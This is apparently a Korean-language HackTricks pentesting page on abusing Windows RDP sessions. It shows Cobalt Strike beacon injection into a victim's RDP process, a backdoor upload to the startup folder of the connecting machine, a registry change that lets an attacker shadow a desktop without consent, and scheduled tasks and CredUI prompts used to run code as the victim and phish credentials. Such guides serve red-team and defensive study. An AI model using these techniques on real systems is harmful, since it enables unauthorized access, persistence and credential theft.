# RDP 세션 악용

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

현재 도메인의 **컴퓨터**에 **RDP 액세스 권한**이 있는 **외부 그룹**이 있다면, 해당 컴퓨터를 침해한 공격자는 그룹 구성원이 연결할 때까지 기다릴 수 있습니다.

사용자가 RDP를 통해 연결하면, **공격자는 해당 사용자의 세션으로 pivot**하여 외부 도메인에서 사용자의 권한을 악용할 수 있습니다.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

다른 도구를 사용해 **세션을 탈취하는 방법**은 [**이 페이지에서 확인하세요.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## 세션 간 인증 릴레이

다른 도메인 사용자의 **활성 콘솔 또는 RDP 세션**은 동일한 호스트에서 낮은 권한의 셸을 확보한 경우에도 단서가 될 수 있습니다. DCOM 세션 간 활성화를 통해 해당 대화형 세션의 적합한 COM 서버가 인증을 수행하게 할 수 있으며, RemotePotato0 또는 KrbRelay와 같은 도구로 그 인증을 캡처하거나 릴레이할 수 있습니다. 로그인한 사용자가 도메인 관리자일 필요는 없습니다. gMSA 관리 암호를 읽을 권한과 같이 범위가 제한된 디렉터리 권한만으로도 추가 피벗이 가능할 수 있습니다.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

먼저 `query user`, `qwinsta` 또는 기존 winPEAS 세션 인벤토리에서 세션 ID와 ID를 확인하세요. 이를 릴레이 경로의 증명이 아니라 **후보**로 취급하세요. COM 클래스, 해당 클래스의 가장 및 인증 수준, 세션 접근성, 방화벽/OXID 라우팅, 대상 프로토콜 보호 기능, 로그인한 주체의 유효 권한이 모두 중요합니다. KrbRelay는 세션 간 LDAP, HTTP, SMB 및 NTLM 예제를 문서화하고 있지만, 이러한 경로는 버전과 구성에 따라 달라집니다. LDAP 채널 바인딩도 대상 측의 릴레이 방어 요소입니다. 특히 RemotePotato0 프로젝트는 원래 RPC-to-LDAP 익스플로잇 시나리오가 2022년에 수정되었다고 설명합니다. 눈에 보이는 세션만으로 LDAP 릴레이가 성공한다고 단정하지 마세요.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

사용자가 **공격자가 대기 중인 머신에 RDP로 접속**하면, 공격자는 **사용자의 RDP 세션에 beacon을 주입**할 수 있습니다. 또한 **피해자가 RDP 접속 시 자신의 드라이브를 마운트했다면**, **공격자가 해당 드라이브에 접근할 수 있습니다**.

이 경우 **피해자의 원래 컴퓨터**의 **statup 폴더**에 **backdoor**를 작성해 해당 컴퓨터를 **침해**할 수 있습니다.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

피해자가 이미 **active RDP session**을 사용 중인 호스트에서 **local admin** 권한이 있다면, **비밀번호를 탈취하거나 LSASS를 덤프하지 않고도 해당 데스크톱을 보거나 제어할 수 있습니다**.<sup>[[1]](#references)</sup>

이는 다음 위치에 저장된 **Remote Desktop Services shadowing** 정책에 따라 달라집니다.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

흥미로운 값:

- `0`: 비활성화
- `1`: `EnableInputNotify` (제어, 사용자 승인 필요)
- `2`: `EnableInputNoNotify` (제어, **사용자 승인 불필요**)
- `3`: `EnableNoInputNotify` (보기 전용, 사용자 승인 필요)
- `4`: `EnableNoInputNoNotify` (보기 전용, **사용자 승인 불필요**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

이는 권한이 높은 사용자가 RDP로 연결한 뒤 잠금 해제된 데스크톱, KeePass 세션, MMC 콘솔, 브라우저 세션 또는 관리자 셸을 열어 둔 경우 특히 유용합니다.

## 로그인한 사용자로 예약 작업 실행

**로컬 관리자**이고 대상 사용자가 **현재 로그인한 상태**라면, Task Scheduler를 사용해 **해당 사용자의 비밀번호 없이** 그 사용자로 코드를 실행할 수 있습니다.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

이를 통해 피해자가 이미 로그인한 세션을 실행 수단으로 활용할 수 있습니다:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

메모:

- 사용자가 **로그온하지 않은 상태라면**, Windows는 일반적으로 해당 사용자로 실행되는 작업을 만들 때 비밀번호를 요구합니다.
- 사용자가 **로그온한 상태라면**, 작업에서 기존 로그온 컨텍스트를 재사용할 수 있습니다.
- 이는 LSASS를 건드리지 않고 피해자 세션 내에서 GUI 작업을 실행하거나 바이너리를 시작하는 실용적인 방법입니다.

## 피해자 세션에서 CredUI 프롬프트 악용

**Shadow RDP** 또는 **해당 사용자로 실행되는 예약 작업** 등을 통해 **피해자의 대화형 데스크톱 내부에서** 실행할 수 있게 되면, CredUI API를 사용해 **실제 Windows 자격 증명 프롬프트**를 표시하고 피해자가 입력한 자격 증명을 수집할 수 있습니다.<sup>[[1]](#references)</sup>

관련 API:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

일반적인 흐름:

1. 피해자 세션에서 바이너리를 실행합니다.
2. 현재 도메인의 브랜딩과 일치하는 도메인 인증 프롬프트를 표시합니다.
3. 반환된 인증 버퍼를 해제합니다.
4. 제공된 자격 증명을 검증하고, 유효한 자격 증명이 입력될 때까지 선택적으로 프롬프트를 계속 표시합니다.

가짜 HTML 양식 대신 표준 Windows API가 프롬프트를 표시하므로 **호스트 내부 피싱**에 유용합니다.

## 피해자 컨텍스트에서 PFX 요청

동일한 **사용자 계정으로 예약 작업을 실행하는** 기법을 사용하면, 로그인한 피해자 계정으로 **인증서/PFX**를 요청할 수 있습니다. 이후 해당 인증서를 해당 사용자 계정의 **AD 인증**에 사용하여 비밀번호 탈취를 피할 수 있습니다.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

개략적인 흐름:

1. 피해자가 로그인한 호스트에서 **local admin** 권한을 획득합니다.
2. **예약 작업**을 사용해 피해자 계정으로 등록/내보내기 작업을 실행합니다.
3. 생성된 **PFX**를 내보냅니다.
4. 해당 PFX를 PKINIT / 인증서 기반 AD 인증에 사용합니다.

후속 악용 방법은 AD CS 페이지를 참조하세요.

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - 플랫 네트워크에서 계층화 모델을 통한 잠긴 도메인까지](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – `mstsc` shadow-session 옵션](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - Shadow RDP 플러그인 PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as 모듈](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - 예약 작업을 통한 PFX 요청 PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - 세션 간 DCOM 활성화 및 현재 제한 사항](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - 세션 간 relay 예시 및 CLSID 요구 사항](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - query session 명령](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - ms-DS-GroupMSAMembership 특성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP 채널 바인딩 및 relay 방어](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
